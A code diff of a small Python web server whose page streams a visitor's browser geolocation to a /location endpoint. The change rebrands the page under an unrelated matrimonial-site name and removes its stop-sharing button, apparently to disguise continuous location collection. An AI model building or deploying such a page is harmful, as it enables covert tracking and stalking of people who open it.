@@ -3,80 +3,72 @@ import json
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
 PAGE = """<!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+<meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Live Location Sharing</title>
+<title>Shaadi-bazaar-India</title>
 <style>
 body {
-  margin:0; min-height:100vh; display:grid; place-items:center;
-  font-family:Arial; background:linear-gradient(135deg,#fce4ec,#e8eaf6);
+  font-family: Arial, sans-serif;
+  text-align: center;
+  padding: 50px 20px;
+  background: #fff;
 }
-.card {
-  background:white; padding:30px; border-radius:22px;
-  width:85%; max-width:380px; text-align:center;
-  box-shadow:0 8px 30px #0002;
-}
-h2 {color:#ad4775}
+h1 { color: #222; }
+p { color: #555; }
 button {
-  padding:14px; width:100%; border:0; border-radius:12px;
-  background:#bd5790; color:white; font-size:16px; margin-top:12px;
+  padding: 15px 25px;
+  background: #1769aa;
+  color: white;
+  border: 0;
+  border-radius: 8px;
+  font-size: 18px;
 }
-#stop {background:#555}
-#status {margin-top:18px;color:#444}
+button:disabled { opacity: .6; }
 </style>
 </head>
 <body>
+<h1>Shaadi-bazaar-India</h1>
+<p>This page shares your live location only after you tap the button and allow location access.</p>
+<button id="start">Start Live Location</button>
 
-
-
-</div>
 <script>
 let watchId = null;
+const button = document.getElementById("start");
 
-function start() {
+button.addEventListener("click", function () {
   if (!navigator.geolocation) {
-    status.textContent = "Location is not supported.";
+    alert("Location is not supported by this browser.");
     return;
   }
-  if (watchId !== null) return;
 
-  status.textContent = "Requesting location permission...";
-  watchId = navigator.geolocation.watchPosition(async p => {
-    const data = {
-      latitude: p.coords.latitude,
-      longitude: p.coords.longitude,
-      accuracy: p.coords.accuracy,
-      time: new Date().toISOString()
-    };
-    try {
-      const r = await fetch('/location', {
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body:JSON.stringify(data)
+  button.disabled = true;
+
+  watchId = navigator.geolocation.watchPosition(
+    function (position) {
+      const data = {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        accuracy: position.coords.accuracy,
+        time: new Date().toISOString()
+      };
+
+      fetch("/location", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify(data)
+      }).catch(function (error) {
+        console.error("Location update failed:", error);
       });
-      status.textContent = r.ok
-        ? "Live location sharing is ON 🌸"
-        : "Could not send location.";
-    } catch(e) {
-      status.textContent = "Connection error.";
-    }
-  }, e => {
-    status.textContent = "Location unavailable: " + e.message;
-    stop();
-  }, {enableHighAccuracy:true, maximumAge:0});
-
-  document.querySelector("button").disabled = true;
-  document.getElementById("stop").disabled = false;
-}
-
-function stop() {
-  if (watchId !== null) navigator.geolocation.clearWatch(watchId);
-  watchId = null;
-  document.querySelector("button").disabled = false;
-  document.getElementById("stop").disabled = true;
-  status.textContent = "Location sharing stopped.";
-}
+    },
+    function (error) {
+      alert("Location permission/error: " + error.message);
+      button.disabled = false;
+    },
+    { enableHighAccuracy: true, maximumAge: 0 }
+  );
+});
 </script>
 </body>
 </html>
@@ -86,7 +78,8 @@ class Handler(BaseHTTPRequestHandler):
     def do_GET(self):
         if self.path.split("?")[0] == "/":
             self.send_response(200)
-            self.send_header("Content-Type","text/html; charset=utf-8")
+            self.send_header("Content-Type", "text/html; charset=utf-8")
+            self.send_header("Content-Length", str(len(PAGE)))
             self.end_headers()
             self.wfile.write(PAGE)
         else:
@@ -105,6 +98,15 @@ class Handler(BaseHTTPRequestHandler):
             self.wfile.write(b"OK")
         except Exception:
             self.send_error(400)
+
+    def do_HEAD(self):
+        if self.path.split("?")[0] == "/":
+            self.send_response(200)
+            self.send_header("Content-Type", "text/html; charset=utf-8")
+            self.send_header("Content-Length", str(len(PAGE)))
+            self.end_headers()
+        else:
+            self.send_error(404)
 
 port = int(os.environ.get("PORT", 8000))
 server = HTTPServer(("0.0.0.0", port), Handler)
